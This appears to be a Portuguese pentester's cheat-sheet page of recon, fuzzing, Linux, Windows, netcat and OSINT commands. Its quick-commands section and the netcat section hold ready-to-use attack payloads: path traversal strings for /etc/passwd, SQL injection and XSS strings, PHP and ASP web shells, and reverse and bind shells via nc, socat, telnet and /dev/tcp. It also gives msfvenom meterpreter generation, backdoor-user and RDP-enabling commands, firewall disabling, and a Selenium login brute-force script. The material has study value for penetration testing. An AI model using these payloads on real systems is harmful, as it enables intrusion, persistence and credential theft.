## BLOCO DE ANOTAÇÕES DE UM HACKER ÉTICO

[GUIA PARA INICIANTES](https://ygoralberto.github.io/guia-iniciantes) EM CIBERSEGURANÇA

PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDOWS E LINUX

[MAPA MENTAL](https://www.mindmeister.com/app/map/3061159266?t=omAcVhonO1) PARA PENTESTERS 

[KNOWLEDGE BASE](/knowledge) PARA GUIAR EM VULNERABILIDADES CONHECIDAS

[FERRAMENTA ANALISE WEB](https://github.com/YgorAlberto/bird-tool-web) BIRD-TOOL-WEB: Script automatizador de ferramentas

## COMANDOS RÁPIDOS


	nmap -vv -sUV -sC -O -p- -A --script vuln -Pn --open -oN saida-save 10.10.10.0/24

.

	ncrack -U user-file -pass senha -p smb -iL host-list

.

	cat saida-nmap.txt | grep \tcp | cut -d "/" -f 1 | grep -v ports | sort -un | tr '\n' ',' > all_ports
 
.
	
	gobuster dir -u http://HOST/ -w /usr/share/dirb/wordlists/big.txt -k -t 100 -e --no-error -r -o fuzz-gobuster -a Mozilla/5.0 --exclude-length 123456 -x php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql,js,png,jpg,jpeg,config,sh,cfm,zip,log

.

	feroxbuster --url http://server.com/ --methods GET,POST -r -A -w /usr/share/dirb/wordlists/big.txt -o fuzz-feroxbuster -x php bkp old txt xml cgi pdf html htm asp aspx pl sql js png jpg jpeg config sh cfm zip log

.

	dirsearch -u https://exampl.com/ --crawl --full-url -t 1 --user-agent Mozilla/5.0 -e php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql,js,png,jpg,jpeg,config,sh,cfm,zip,log -o fuzz-dirsearch
 
.

	ffuf -u http://site/FUZZ -w /usr/share/dirb/wordlists/big.txt -c -t 100 -e .php,.bkp,.old,.txt,.xml,.cgi,.pdf,.html,.htm,.asp,.aspx,.pl,.sql,.js,.png,.jpg,.jpeg,.config,.zip,.log -o output-site-raiz.html -of html

.

	dirb https://sitealvo.com.br/ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -a KidMan -X .php,.bkp,.old,.txt,.xml,.cgi,.pdf,.html,.htm,.asp,.aspx,.pl,.sql,.js,.png,.jpg,.jpeg,.config,.sh,.cfm,.zip,.log -o dirb-sitealvo-raiz

.

	wpscan --url sub.site.com.br/ --api-token 9iwuoirwer0987wehrEve7tzY3mF9CnxFyiwuer  --random-user-agent --enumerate vp --plugins-detection aggressive 

.

	wapiti --scope domain -m all -d 10 -A Mozilla/5.0 -u  url.com.br

.

	sqlmap -r request.txt -p param-to-sqlmap-test --risk=3 --level=5 | echo "EDITE O ARQUIVO E COLOQUE UM * NO CAMPO QUE DESEJA FAZER OS TESTES"

.

	for url $(cat urls);do echo "$domain" && curl -s -o /dev/null -w "%{http_code}\n" --connect-timeout 10 $url;done

.

	/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd%00

.

	/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

.

	%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

.

	/../../../../../../../../../../etc/passwd

.

	/../../../../../../../../../../C:/Windows/System32/drivers/etc/hosts
 
.

	%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fC%253A%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts
	
.

	;dir;#
	
.

	admin' OR'1'='1--

.

	<script>alert('Pentester')</script>

.

	javascript:alert('XSS href')

.

	<img src="invalid.jpg" onerror="alert('XSS IMG!')"> 
 
.

	<img src="x" onerror="window['aler'+'t']('XSS OnError!')">

.
 
	<iframe src="https://www.retrogames.cc/embed/10030-street-fighter-ii-champion-edition-street-fighter-2-920513-etc.html" width="600" height="450" </iframe>

.

	<iframe src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKT4="></iframe>

.

	<iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"></iframe>

.
 
	<script>window.location='http://malicious.com'</script>

.

	?param=1';alert(1)//  | USAR EM UM CENARIO EM QUE O PARAMETRO EXECUTA ALGO DENTRO DE UM SCRIPT. ANALISAR E AJUSTAR O CODIGO DE ACORDO. OBSERVAR ERRO NO CONSOLE

.

	<?php system($_GET['hacker']);?>
	
.

	<?php system('id');?>

.

 	SHELL EM ASP (shell.asp)
	<%
	Set oS = Server.CreateObject("WSCRIPT.SHELL")
	Set objCmdExec = oS.exec("cmd.exe /c ipconfig")
	getCommandOutput = objCmdExec.StdOut.ReadAll
	Response.Write getCommandOutput
	%>
 	
.

	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f

.

	python3 -m http.server 8080

.

	msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f ext -o name.ext
	
.

	python3 -c 'import pty;pty.spawn("/bin/bash")'
	
.

	net user suporte 12345 /add
	
.

	net localgroup "Remote Desktop Users" suporte /ad
	
.

	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
	
.

	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
	
.

	NetSh Advfirewall set allprofiles state off
	
.

	CloudFlare? WAF? Analisar os registros de históricos da Securitytrails e outra forma é através do E-mail, no receive-from pode haver o IP real

.

	grep -B 1 '[0-9]' techs | grep -av "\-\-" | sed 's/  */ /g' | grep -v '^$'|paste -d ' ' - - | sort -u > techs-clean

.

	grep -v -f termos.txt file.txt

.

	for i in {1..100}; do echo "numero $i" ;fone

.

	grep -v -E '19(1[1-9]|[2-8][0-9]|91)'
 	Explicação da expressão regular:
		19: Captura os primeiros dois dígitos do número.
		1[1-9]: Captura números de 1911 a 1919.
		[2-8][0-9]: Captura números de 1920 a 1989.
		91: Captura o número 1991.
  
.

	mysql -u usuario -p'senha' -D nome_do_banco -e "SHOW TABLES;"

.

	Dalvik/2.1.0 (Linux; U; Android 11; Pixel 5 Build/RQ1A.210205.004)
	Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
	Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
	Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
	Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.131 Mobile Safari/537.36

.

	wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://sub.site.com.br -U "Dalvik/2.1.0 (Linux; U; Android 11; Pixel 5 Build/RQ1A.210205.004)" -l 999

.

	curl -fsSL https://ollama.com/install.sh | sh
	ollama pull llama2-uncensored
	ollama pull deepseek-r1:1.5b :8b :14b :32b
	ollama run deepseek-r1:32b
	ollama run llama2-uncensored

.
.
.
.

## SCRIPT INTERAGE COM NAVEGADOR FIREFOX - BRUTEFORCE de LOGIN - SIMULA NAVEGADOR

Primeiro precia instalar selenium e o geckodriver do firefox para o script fuincionar

	pip3 install selenium --break-system-packages
	https://github.com/mozilla/geckodriver/releases [extrai e insere dentro do diretório do script]
	nano script.py [paste do codigo abaixo]

Script abaixo em python

	```python
	
	from selenium import webdriver
	from selenium.webdriver.common.by import By
	import time
	
	# Inicializa o navegador Firefox
	driver = webdriver.Firefox()
	
	# URL da página de login
	url_login = "http://exemplo.com/login"
	
	# Lê a lista de credenciais (formato: usuario:senha por linha)
	with open("credenciais.txt", "r") as f:
	    credenciais = [linha.strip().split(":") for linha in f.readlines()]
	
	# Faz brute force
	for usuario, senha in credenciais:
	    driver.get(url_login)
	    time.sleep(1)
	
	    try:
	        # Ajuste os seletores conforme o HTML da página
	        campo_usuario = driver.find_element(By.NAME, "username")
	        campo_senha = driver.find_element(By.NAME, "password")
	        botao_login = driver.find_element(By.XPATH, '//button[@type="submit"]')
	
	        campo_usuario.clear()
	        campo_senha.clear()
	
	        campo_usuario.send_keys(usuario)
	        campo_senha.send_keys(senha)
	        botao_login.click()
	
	        time.sleep(2)  # Espera a resposta da página
	
	        # Lógica para detectar sucesso (pode ser por URL, texto, etc)
	        if "dashboard" in driver.current_url or "bem-vindo" in driver.page_source.lower():
	            print(f"[+] Sucesso! Usuário: {usuario} | Senha: {senha}")
	            break
	        else:
	            print(f"[-] Falhou: {usuario} | {senha}")
	
	    except Exception as e:
	        print(f"[!] Erro: {e}")
	        continue
	
	driver.quit()
	
	```


## Ferramentas After Formating

	sudo apt install seclists hackrawler assetfinder sublist3r subfinder

Script Check IP
	
	curl -s https://meuip.com.br | grep "Meu ip" > .meuip
	cat .meuip | cut -d " " -f 8 > ip.txt
	sed -i 's/<\/h3>/ /g' ip.txt
	cat ip.txt
	rm .meuip
	rm ip.txt

Full Update Script

	sudo apt update && sudo apt full-upgrade -y && sudo apt autoremove -y

VPN

Configurar a VPN para autenticar automaticamente usando login e senha em um arquivo externo, sendo lido pelo .ovpn. Na linha auth-user-pass informe o arquivo com as credenciais. Ex.: auth-user-pass credenciais

## DOMINANDO TERMINAL LINUX
Tags: comandos terminal | comandos linux

    ifconfig eth0 192.168.2.50 netmask 255.255..
    
Modifica o IP até reiniciar a máquina

    nano /etc/network/interfaces

Arquivo de configuração das interfaces de redes

    /etc/init.d/networking/ restart

Reinicia o adaptador de rede para as configurações padrão PORÉM apenas se no arquivo interfaces estiver com DHCP, caso esteja com STATIC irá pegar o IP de lá.

    route -n M

Mostra a rota atual e o GATEWAY

    route del default

Delete a rota (GATEWAY) do adaptador de rede

    route add default gw 192.168.1.1

Adiciona o IP da rota default

    netstat 

Status da rede (detalhadamente usando as flags)

    netstat -lntp
    netstat -vatunp

Lista os serviços Portas Nomes no protocolo TCP rodando atualmente

    service ssh start/stop/restart

Inicia ou para o serviço de SSH

    vi

Leitor de texto. I: Insere dados; DD: Deleta a linha; WQ: Sai salvando; Q!: Sai sem salvar 

    apt search php

Procure por opções de instalação do programa informado

    dpkg -l

Exibe os pacotes .deb instalados com o DPKG

    update-rc.d ssh enable

Habilita permanente o serviço ssh

    locate #find /pasta/ -name #whereis #which 

Buscadores de arquivos/programas (updatedb atualiza base)

	grep -E -e 'termo1|termo2' arquivo.txt

Grep com dois termos na pesquisa para printar

	grep -B 4 -A 1 "sua linha específica" arquivo.txt

Faz a busca pela palavra e exibe linhas acima e linhas abaixo de acordo com a quantidade

    grep "procura" /arquivo/

Busca procura no arquivo e exibe a linha

    grep -v "procura" /arquivo/ 

Exibe o que não tem procura no arquivo e exibe a linha

    grep -r "palavra dentro do arquivo" 

Procura dentro dos arquivos dos diretórios as palavras nas "

    awk -F : '{print "O usuario " $1 " Tem dir " $6}' /etc/passwd

Procura avançada no arquivo

    cut -d : -f1,6 /etc/passwd 

Faz os mesmo do comando acima

    sed -i 's/troca/porisso/g' test.txt 

Faz substituição de nomes nos arquivos usar ^ para add algo no início da cada linha

    sed '/sss/a linha depois' teste

Insere um texto especifico depois ou antes da palavra da linha informada, para inserir antes usar o `i` no lugar do `a`

    sed -i.bak -e '5,10d;12d' file

Deleta a linha informada no exemplo é da linha 5 até 10 e a linha 12. Esse comando ja salva no arquivo remover o `-i.bak` para printar o resultado

    cat file.txt | tr '\n' ','

Ler o arquivo que esta em lista e coloca tudo em uma só linha separando os itens por virgula

    cat saida-nmap.txt | grep \tcp | cut -d "/" -f 1 | grep -v ports | sort -un | tr '\n' ',' > all_ports

Pega a saída do NMAP e separa as portas para fazer um ataque mais direcionado.

    cat list.txt | awk '{gsub(/word/, "\033[31m&\033[0m")} 1'

Printa todo o arquivo passado highlighting/marcando uma palavra passada usando cat e awk

    awk '{$1=$1}1' hash1 > hash1_novo
    sed -i 's/[[:space:]]//g' arquivo.txt

Tira todos os espaços em branco do início e fim da linha

    ls -la 

Exibe os arquivos ocultos

    rm -rf nome-da-pasta 

Remove todos os arquivos da pasta

    watch -nt1 'ls -la /tmp'

Assiste o output do comando informado

## DOMINANDO O PROMPT DE COMANDO WINDOWS
Tags: criar usuarios cmd | comandos cmd | cmd windows

    %cd% 

É semelhante ao pwd

    cd \ 

Vai para raiz

    echo ygor ygor.txt 

Cria arquivo com nome ygor dentro

    type arquivo.txt

Semelhante ao cat

    move arquivo.txt ../

Move arquivo para pasta anterior

    del arquivo.txt

Deleta arquivo

    attrib +ou-h pasta/diretório

Ocultar/desocultar diretório

    dir /a 

Lista arquivos ocultos

    rmdir /s 

Remove diretório

    dir /s ygor.txt 

Procura arquivo

    tasklist

Lista as tarefas 

    net user

Lista os usuários

    net user usuario s3nh4 /add

Adiciona um usuario

    net user usuario /delete

Remove usuario

    net localgroup "Remote Desktop Users" kidman /add

Add usuario ao grupo remote users


[Adicionar usuários](https://ampliando.net/?p=491#:~:text=Para%20adicionar%20um%20usu%C3%A1rio%20de,computador%20estiver%20conectado%20%C3%A0%20rede)


## VISÃO GERAL SOBRE WEB E HTTP


Melhorar segurança servidor apache: 
	Remover do arquivo de configuração `/etc/apache2.conf` a palavra indexes nas confs do diretório `/var/www/`
	Trocar em `/etc/apache2/conf-enabled/security.conf` em `ServerTokens` de **OS**para **Prod** e em `ServerSignature` colocar **Off**

    nc -v www.kidmancorp.com.br 80 

Printa o site no terminal

Colocar na entrada da conexão `GET / HTTP/1.0 ou no lugar de GET HEAD, OPTIONS`

	printf "HEAD / HTTP/1.0\r\n\r\n" | nc kidmancorp.com.br 80

Faz a mesma coisa do comando acima

	curl -v kidmancorp.com.br 

Faz a mesma coisa do comando acima


## ANALISE DE LOGS


    cat access.log | cut -d " " -f1 | sort | uniq -c | sort -unr 

Lista os IPs em ordem decrescente por quantidade de requisição:

    cut -d " " -f1  
    
`-d` é o delimitador e `-f1` é a coluna que deseja imprimir

    sort 

Printa a saída em ordem; `-u` printa única vez; `-r` ordem reversa; `-n` ordem crescente

    uniq -c 

Printa a saída com a quantidade de vezes que um item aparece

    head -n1  

Printa a primeira saída

    tail -n1 

O oposto do head



## TCP/IP PARA PENTESTERS


    macchanger -t eth0

Troca o MAC da placa randomicamente -p volta ao original

    ipcalc 192.168.0.211/255.255.255.0 

Apresenta uma saída de cálculo de IP

    arp -an 

Exibe informações guardadas  do ARP na máquina local


## ANALISADORES DE PROTOCOLOS

    printf  "%d\n" 0x(code hex) 


Decifrar código em hexadecimal



- Análise de código de um pacote

Os 6 primeiros é o MAC de destino os 6 próximos é o MAC de origem os próximos 2 é o Protocolo o restante é o Payload:

    d4 ab 82 45 c4 0c 00 0c 29 76 43 e1 08 00 45 00
    02 37 2c c0 40 00 40 06 77 32 c0 a8 00 0a 25 3b
    ae e1 a9 fe 00 50 ff 4d 66 60 dd cb e4 96 80 18
    00 e5 96 f8 00 00 01 01 08 0a f7 cb 2f 62 41 1c
    2e df 50 4f 53 54 20 2f 69 6e 74 72 61 6e Payload... 

[Conversor de Hexadecimal](https://en.rakko.tools/tools/77/)
[Conversor de pacotes](https://hpd.gasmi.net/)
[Decifrador de códigos (CyberChef)](https://gchq.github.io/CyberChef/)

Socket significa IP e porta 


- Comandos úteis para Wireshark e TCPDUMP

.

    tcpdump -vvvxr monitoramento.pcapng 'tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)' 

Encontra as portas abertas Orig > Dest

    tcp contains "palavra desejada"

Procura nos pacotes a "palavra desejada"

    tcp contains "%PDF-"

Procura nos pacotes donwload do pdf

    ip.addr == 192.168.0.123

Filtra os pacotes pelo IP

    Ip.connection.synack

Filtra pacotes com FLAGs SYN e ACK

    tcp.port == 443

Filtra a porta 443 nos pacotes capturados

    dns 

Procura pacotes que usaram o serviço DNS


## BASH SCRIPTING (LINUX)

	#!/bin/bash
	#!/bin/sh
	#Meu primeiro Script
	echo "Imprime alguma coisa" # comando para imprimir uma saída
	echo "tempo em que o PC está ligado: " $(uptime -p)
	echo "diretório: " $(pwd)
	echo "User: " $(whoami)
	echo "Infome o IP"
	read ip
	porta=80
	echo "varrendo o host: " $ip "Na porta: " $porta
	echo "====================================="
	echo "digite o serviço a ser iniciado"
	read var1
	service $var1 restart
	echo "--------Serviços ativos------"
	ps aux | grep $var1
	echo "--------Portas abertas: -----------"
	netstat -nlpt
	echo {1..10} printa do 1 ao 10 (sequência)
	seq 1 100 Printa sequencia de forma vertical 
	for ip in {1..10}; do echo 192.168.2.$ip;done
	while true; do echo "Hacked"; done
	sed 's/.$//' Substitui o último caractere
	sed 's/^.//' Substitui o primeiro caractere
	sed 's/^/inicio/' Insere no início da linha
	sed 's/$/final/' Insere no final da linha
 	find . -type f -exec sed -i 's/senha123/senhaSegura2025/g' {} + TROCA DE FORMA RECURSIVA UM TEMRO POR OUTRO DENTRO DE CADA ARQUIVO
	hping3 -S -p 80 -c 1 host Pingar porta específica

1> STDOUT

2> STDERR

0>  STDIN

	grep "href" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | grep -v "<li" > parsinglist

Faz um parsing em uma pagina trazendo os links que a mesma possui.

	for url in $(cat parsinglist);do host $url | grep -v "NX";done

Pega a saída do pasring acima e gera a lista de IP dos links capturados.

	for ip in $(cat hostsativoVPNkidman);do hping3 -SA -p 1337 $ip;done                                                                                             
Pega a lista de IP e faz um teste na porta 1337 para saber se a mesma está aberta.	

[Port Knocking:](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/)

	knock 192.168.0.20 254 785 135 -d 500

Ferramenta que faz o portknowcking no host e portas passadas.

	xclip -i -selection p hash-icon
 
Comando para copiar para o clipboard o conteúdo do arquivo

## POWERSHELL PARA PENTESTERS

Script POWERSHELL

	param($param1)

	if ("!$param1"){
	    echo "Digite um Parâmetro para leitura"
	}else{
	    ping -n 1 $param1 | Select-String "bytes=32"
	}
	echo "Ygor Offensive Security Expert"
	$nome = Ygor
	echo "Qual seu nome: $nome"
	$ip = Read-Host "Digite o IP:"
	$port = 443
	echo "Varrendo o host: $ip na porta: $port"
	echo "Executando pinga no host informado"
	ping -n 1 $ip | Select-String "bytes=32"
	foreach ($var1 in 1..10) {echo 10.0.0.$var1}
	param($p1)
	foreach ($ip in 1..254){
	ping -n 1 $p1.$ip | Select-String "bytes-32"
	}

Comandos Windows equivalentes no LINUX

    Tratamento de erro: try catch

    Negação ou ausência no IF é !

    Semelhante ao GREP: Select-String "bytes=32"

    Semelhante ao CUT -D: $resp.Line.split(' ')[2] -replace ":"," "

- Port Scan on PowerShell

. 

	param($ip)
	 if (!$ip){
		echo "Tratativa de erro"
		echo "Informe o Host"
	}else{
	$topports = 21,22,3306,80,443
	try{foreach ($porta in $topports){
	if (Test-NetConnection $ip -port $porta -WarningAction SilentlyContinue -InformatioLevel Quiet)
		echo "Porta $porta Aberta"
	}} else {
		echo "Porta $porta Fechada"
	}} catch {}
	}

- Comandos POWERSHELL WEB

.

	Invoke-WebRequest www.kidmancorp.com.br -OutFile index.txt
            -Method options/header
	(Invoke-WebRequest www.kidmancorp.com.br).statuscode/content/links.href/header.server

## SWISS ARMY KNIFE

Netcat é o famoso canivete suíço

    nc 192.168.2.1 80 

Conexão usando NETCAT

    nc -vnlp 8080 

(verbose|não traduz IP|listening|port) 
Abrindo uma porta usando

    nc -vnlp 80 < banner

Abre a porta 80 e carrega o arquivo quando fechado o netcat

    nc -vnu 192.168.2.1 80 

Conexão usando NETCAT

    nc -vnlup 8080

(verbose|não traduz IP|listening|udp|port) Abrindo uma porta usando


 - Copiando arquivos entre hosts com o NETCAT

.

    nc -vnlp 5050 < arquivo.ext 

Abre a conexão com o nome do arquivo que vai receber.

    nc -v 192.168.0.10 5050  < arquivo.ext 

Conecta enviando o arquivo para a porta aberta do destino.

    du -h arquivo.ext 

Verifica o tamanho do arquivo enviado e compara para certificar a integridade.


- Port Scanning

.

    nc -vnz 192.168.0.10 80 

Escaneia a porta 80 do IP

    nc -vz www.kidmancorp.com.br 80  

Escaneia a porta 80 do site

    nc -vnz 192.168.0.10 20-1024 

Escaneia da porta 20 à 1024

    for ip in $(cat portlist);do nc -vnz 192.168.1.5 $ip;done 

PortScan usando um arquivo


- HoneyPot

.

    while true;do sudo nc -vnlp 21 < 21.txt 1>> log21.txt 2>> log21.txt; echo $(date) >> log21.txt;done

Comando para abrir a porta 21 e monitorar com banner e captura de logs

    nc -vnlp 21& 

Abrir porta e deixar em background (dentro de script)


Nota: Bind Shell x Reverse Shell: Bind abre a porta no servidor alvo e Reverse abre a porta na máquina atacante!

    nc -vnpl 5050 -e /bin/bash 

BIND SHELL disponível para conexão no Linux

    nc -vnpl 5050 -e cmd.exe 

BIND SHELL disponível para conexão no Windows

    nc -vn 192.168.0.1 5050 -e cmd.exe 

REVERSE SHELL disponível para conexão no Windows

    nc -vn 192.168.0.1 5050 -e /bin/bash 

REVERSE SHELL disponível para conexão no Linux

Nota: É possível usar uma porta que esta com o status fechada no nmap e burlar o firewall
É possível conectar com reverse shell quando o firewall bloqueia no servidor qualquer conexão de entrada.
Com o firewall bloqueando entrada e saída, abre uma porta no atacante que já está aberta no alvo e conecta o alvo via reverse no atacante. 

Ncat

    openssl req -x509 -newkey rsa:2048 -keyout chave.pem -out cert.pem -days 10

Criando certificado ssl para a comunicação no NCat.

    ncat -vnlp 8443 --ssl-key chave.pem --ssl-cert cert.pem

Abre a porta de forma criptografada --allow 192.168.0.5 (permite conexões apenas do host informado).

    ncat -vn 192.168.2.200 8443 --ssl 

Conectando de forma encriptada.


Socat

    socat tcp4-listen:2222 

Alternativa para netcat o - serve para não precisar passar os dois endereços

    socat tcp4:192.168.2.106:555

Conectando na porta do alvo

    socat tcp-listen:4444 EXEC:/bin/bash

Ganhando acesso ao shell


Telnet

    telnet www.kidmancorp.com.br 80 21

Opção alternativa ao NC, ftp...


Alternativa para conexão reversa usando telnet:

Abrir duas portas na máquina atacante 4444 e 4445 e executar o comando no alvo: telnet 172.23.58.96 4444 | /bin/bash | telnet 172.23.58.96 4445

DEV/TCP

    echo "Mensagem" > /dev/tcp/192.168.2.106/4444 

Conecta com o host com a porta aberta


     >/dev/tcp/192.168.2.106/4444 && echo "Porta aberta" 

PortScan

    bash -i > /dev/tcp/192.168.2.106/4444 0>&1 2>&1 

Envia o bash para o destino e os erros e saídas aparecendo para o destino



## INFORMATION GATHERING - BUSINESS


    hunter.io 

Procura por emails apenas informando o domínio do site.

    http://pwndb2am4tzkvold.onion

procura por dados em LEAKS


    Usando TOR no firefox

Instala o tor e proxychains, no arquivo de configurações do proxychains adiciona a linha do socks5 e no firefox add o ip e porta do proxy.

    https://github.com/jdiazmx/karma 

Consulta local de LEAKS com TOR instala o KARMA inicia o TOR e usa para consultar LEAKS

    site:pastebin.com "senhas" 

Procura por palavras "senhas" no site pastebin

    site:trello.com "senhas" 

Procura por palavras "senhas" no site pastebin

    urlcrazy domainname.com 
	dnstwist -w -r domainname.com

Procura domínios similares ao da entrada


Google Hacking:

    filetype: intext: inurl: :.com.br 

Google hacking para pesquisas avançadas

    cache: url.com.br/do/site/indisponível

Pesquisa o cache do site que não está mais disponível 

    exploit-db.com/google-hacking-database 

Base de pesquisas no google Dorks

	firefox 'https://google.com/search?q=site:site.com.br+inurl:exemplo' 
	firefox https://google.com/search?q=inurl:/proc/self/cwd
	firefox https://google.com/search?q=intitle:index of id_rsa index
	firefox https://bing.com/search?q=ip:+104.22.36.86
	firefox https://google.com/search?q=
	firefox https://google.com/search?q=
	firefox https://google.com/search?q=

[Dork Base](https://gbhackers.com/latest-google-dorks-list/)

URL comando para google hacking

    lynx site.com 

Navegador por linha de comando

    iana.org/whois 

Procura por endereços direto da fonte na IANA

    lynx --dump 'https://google.com/search?q=site:site.com.br+ext:pdf'  

Faz um dump com o navegador com linha de comando por PDF

    wget -q 

Não apresenta a saída

    whois -h iana.org/whois site.com.br 

Força usa a iana na pesquisa

    Client.rdap.org

Alternativa para o whois 


Nota: ASN e NETBLOCK Asn é um provedor que precisa de vários netblocks (Blocos de IP)

## INFORMATION GATHERING INFRA


Mapear bloco de IP do alvo: search.arin.net/rdap/ OU WHOIS com IP

    inetnum é o bloco de ip

    aut-num é o ASN (caso tenha)

Não retornando nada pode ser que o IP apresentada não pertença à empresa nesse caso com o host pega-se a segunda saída e verifica o IP

Border Gateway Protocol (bgp.he.net e bgpview.io, praticamente tudo está aqui) alternativo [here](https://pt.infobyip.com/)

Shodan

Pesquisa avançada por domínios, portas, IPs, câmeras, espalhadas pelo mundo

    hostname: Nome do site
    os: Sistema operacional
    port: Porta
    IP: IP
    net Busca por rede
    country: País
    city:  cidade
    geo Geolocalização
    org Por uma organização
    "": Procura por termo

    shodan init chaveapi 

Inicia uma sessão via terminal do Shodan 12

    shodan count country:br port:445 contabilidade 

Procura e mostra a quantidade de host disponíveis

    shodan search --fields ip_str,org,port,hostnames country:br port:445

    shodan host 201.147.25.236


Censys

Basicamente a mesma função do SHODAN

    location.country_code: BR AND metadata.os: windows 80.http.get.title: TI 

Busca no Censys parecida com as buscas feitas no shodan

Binary Edge 

Mesma proposta do Shodan e Censys Disponivel [Aqui](https://app.binaryedge.io/login)


Domain Name System

    host -t A site.com 

Busca IPv4

    host -t mx site.com 

Busca informações do servidor de EMAIL

    host -t ns site.com 

Servidores primarios e secundarios ou mais

    host -t hinfo site.com

Informações do site

    host -t aaaa site.com 

Retorna infor do IPv6

    host -t txt site.com 

Retorna strings em texto info do TXT com configurações do SPF (email) 

    Host for server in $(host -t ns kidmancorp.com.br | cut -d " " -f4);do host -l -a kidmancorp.com.br $server;done 

Verificando vulnerabilidade de transferência de zona no DNS com o comando 

    for domain in $(cat wordlist.txt);do host -t a $domain.site.com.br | grep -v "NXDOMAIN";done

Descoberta de HOST por Brute Force

    for ip in $(seq 220 239);do host 48.60.285.$ip;done

Descoberta de Domínios por IP

    host -t txt kidman.com.br 

Irá retornar os códigos do SPF sabendo se é vulnerável ou não então, realizar teste de envio spoofing: Email Sender: https://emkei.cz/


SPF = Verifica quais servidores estão autorizado enviar emails em seu domínio

	?all Libera tudo
	~all Libera mas com alerta de perigo
	-all recomendado

Subdomain Takeover

    host -t cname kidmancorp.com.br

Verifica para onde aponta o Alias possibilitando testar se o Alias existe ou não, podendo assim registrar se possível e ter domínio sobre o registro apontado.

    host -t hinfo kidmancorp.com.br

Verifica mais informações do domínio apresentado.

    for domain in $(cat wordlist.txt);do host -t cname $domain.$1 | grep "alias for";done

Apresenta os CNAMEs (ALIAS) do SubDomínio encontrado, podendo ou não ser vulnerável.

    dig -t ns site.com.br 

Alternativa do comando host

    dig -t  axfr site.com $ns2.site.com 

Semelhante ao host, faz a tentativa de transferência nos srv de name servers


Ferramentas de Enumeração já pronta

    dnsenum site.com 

Enumeração de DNS, brute force etc.

    dnsrecon site.com 

Apresenta as possíveis vulnerabilidades do domínio

    fierce -dns site.com  

Apresenta as possíveis vulnerabilidades do domínio com bruteforce

Pesquisa passiva sobre domínio

[Virus Total:](https://www.virustotal.com/gui/home/upload)

[DNS Dumpster:](https://dnsdumpster.com/)

[CeRtificaTe Search](crt.sh)

[Security Trails:](https://securitytrails.com/)


Sites de análises de certificado pesquisas por possíveis subdomínios vulneráveis

[CRT SH:](https://crt.sh/)
	
[Transparency Report:](https://transparencyreport.google.com/)


## INFORMATION GATHERING WEB


    robots.txt e sitemap.xml

Contém informações de links das páginas do site, em Robots contém as páginas que não são indexadas pelo google.

    wget -m site.com 

Mirror website, copia todos os arquivos e páginas para a máquina (clona website).

    wget -m -e robots=off  site.com 
    wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://exemplo.com

Mirror website, copia todos os arquivos e páginas para a máquina (clona website) sem se importar com o arquivo robots.

    nc -v site.com 80 HEAD / HTTP/1.0 host:site.com 

Comando serve para testar um domínio específico quando há vários no alvo.

    dirb website.com

Faz bruteforce de diretórios  /caminho/da/wordlist/

    dirb website.com -a agenteoculto -X .php 

Faz bruteforce de diretórios sem ser percebido

    curl -v site.com.br 

Faz um CURL do site com verbose

    curl -I site.com.br/asdaf.aspx 

Força mostrar o banner com a versão do ASP.NET PHP JS...

    curl -v -H "User-Agent: Kidman Tool" site.com.br 

Burlando o user agent

    curl -s -o /dev/null -w "%{http_code}" kidmancorp.com.br 

Pegando o código da requisição

    curl -v imap://camila:ca123456@email.site.com.br/INBOX?NEW 

Conecta com IMAP e retorna OK da conexão com a quantidade de emails na caixa

    whatweb site.com.br 

Faz uma busca geral no site e traz informações importantes -v verbose

    whatweb -v --user-agent 'nome aleatorio' site.com 

Wappalyzer Plugin para pegar informações do site como banco, linguagem, tecnologias em geral


## SCANNING


    traceroute site.com 

Faz uma análise de saltos do host. -w tempo de espera, -m Máximo de saltos, -f início da contagem dos saltos, -A indica os ASs dos hosts -n não Nomeia os hosts, -I usar o ICMP, -T TCP, -p porta do alvo, -U UDP na porta 53

    iptables -nL 

Lista as regras do iptables

    iptables -F 

Limpa as regras do iptables

    iptables -P INPUT DROP 

Dropa todos os pacotes na corrente de entrada  

    iptables -A INPUT -p tcp --dport 80 -s 192.168.2.20 -j ACCEPT 

Libera o acesso apenas do host informado na flag -s na porta 80, regra de entrada. --reject-with tcp-reset Dribla o nmap com a reason reset

    fping -a -g 192.168.2.0/24 

